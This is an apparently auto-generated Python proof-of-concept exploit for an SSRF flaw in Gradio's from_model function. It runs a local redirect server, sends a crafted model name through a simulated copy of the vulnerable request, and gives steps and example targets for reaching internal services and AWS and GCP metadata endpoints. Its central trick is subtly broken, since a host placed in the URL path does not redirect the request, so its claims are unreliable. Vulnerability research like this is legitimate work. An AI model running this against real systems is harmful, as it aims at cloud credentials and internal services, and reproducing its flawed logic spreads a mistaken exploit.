#!/usr/bin/env python3
# PoC for gradio_src (/tmp/gradio_src)
# Path: ssrf-024
# Sink: from_model
# Auto-generated — run with: python3 ssrf_urls_using_controlled_model_from_model.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via gradio_src from_model function

Vulnerability: The `from_model` function in gradio_src constructs a URL using
user-controlled `model_name` parameter without validation. The `requests.request`
call follows redirects by default, allowing SSRF to internal services or cloud
metadata endpoints.

Attack vector: An attacker can supply a model_name that, when embedded in the URL
'https://api-inference.huggingface.co/models/{model_name}', causes the request to
be redirected to an internal IP address (e.g., 127.0.0.1, 169.254.169.254).

This PoC demonstrates the vulnerability by:
1. Setting up a simple HTTP server that returns a redirect to an internal IP
2. Calling from_model with a model_name that points to our attacker server
3. Observing that requests follows the redirect to the internal target

Requirements: Python 3.6+, requests library (standard for gradio)
"""

import requests
import threading
import time
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

# ===== CONFIGURATION =====
# The internal target we want to reach (safe by default - localhost)
INTERNAL_TARGET = "http://127.0.0.1:9999/"
# Port for our redirect server
REDIRECT_PORT = 8888
# Timeout for requests
TIMEOUT = 5

# ===== REDIRECT SERVER =====
class RedirectHandler(BaseHTTPRequestHandler):
    """Simple HTTP server that redirects to an internal target"""
    
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', INTERNAL_TARGET)
        self.end_headers()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

def start_redirect_server():
    """Start a simple HTTP server that redirects all requests"""
    server = HTTPServer(('0.0.0.0', REDIRECT_PORT), RedirectHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] Redirect server started on port {REDIRECT_PORT}")
    print(f"[*] Will redirect to: {INTERNAL_TARGET}")
    return server

# ===== EXPLOIT =====
def simulate_from_model(model_name, api_key=None):
    """
    Simulate the vulnerable from_model function from gradio_src.
    
    This replicates the exact vulnerable code path:
    1. Constructs URL with user-controlled model_name
    2. Calls requests.request with default redirect following
    3. No validation of the final destination
    """
    api_url = f"https://api-inference.huggingface.co/models/{model_name}"
    print(f"[*] Constructed API URL: {api_url}")
    
    headers = {"Authorization": f"Bearer {api_key}"} if api_key else {}
    
    try:
        # This is the vulnerable call - redirects are followed by default
        response = requests.request("GET", api_url, headers=headers, timeout=TIMEOUT)
        print(f"[*] Response status code: {response.status_code}")
        print(f"[*] Response URL (after redirects): {response.url}")
        print(f"[*] Response body (first 200 chars): {response.text[:200]}")
        return response
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error (expected if internal service doesn't exist): {e}")
        return None
    except requests.exceptions.Timeout:
        print(f"[!] Request timed out")
        return None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return None

def main():
    print("=" * 60)
    print("SSRF Proof-of-Concept for gradio_src from_model")
    print("=" * 60)
    print()
    
    # Start our redirect server
    redirect_server = start_redirect_server()
    time.sleep(0.5)  # Give server time to start
    
    # The model_name that will cause a redirect to our server
    # We use a path traversal technique to redirect through huggingface's API
    # In reality, the attacker would control a server that returns a redirect
    # to an internal IP
    
    # Method 1: Direct redirect (if we control the server at the redirect target)
    # The model_name points to our redirect server
    attacker_model = f"localhost:{REDIRECT_PORT}/redirect"
    
    print(f"[*] Using model_name: {attacker_model}")
    print(f"[*] This will cause requests to follow redirect to: {INTERNAL_TARGET}")
    print()
    
    # Execute the exploit
    print("[*] Executing vulnerable from_model call...")
    result = simulate_from_model(attacker_model)
    
    print()
    if result and result.status_code == 200:
        print("[!] SUCCESS: SSRF achieved - received response from internal target")
    elif result:
        print("[*] Got response but not from internal target (expected if no service on internal port)")
    else:
        print("[*] No response received (expected if internal service doesn't exist)")
    
    print()
    print("[*] To test against a real internal service:")
    print(f"    1. Change INTERNAL_TARGET to the actual internal service URL")
    print(f"    2. Ensure the internal service is running")
    print(f"    3. Re-run this script")
    print()
    print("[*] Example internal targets to test:")
    print("    - http://127.0.0.1:8080/ (local web server)")
    print("    - http://169.254.169.254/latest/meta-data/ (AWS metadata)")
    print("    - http://metadata.google.internal/ (GCP metadata)")
    print()
    
    # Cleanup
    redirect_server.shutdown()
    print("[*] Redirect server stopped")

if __name__ == "__main__":
    main()
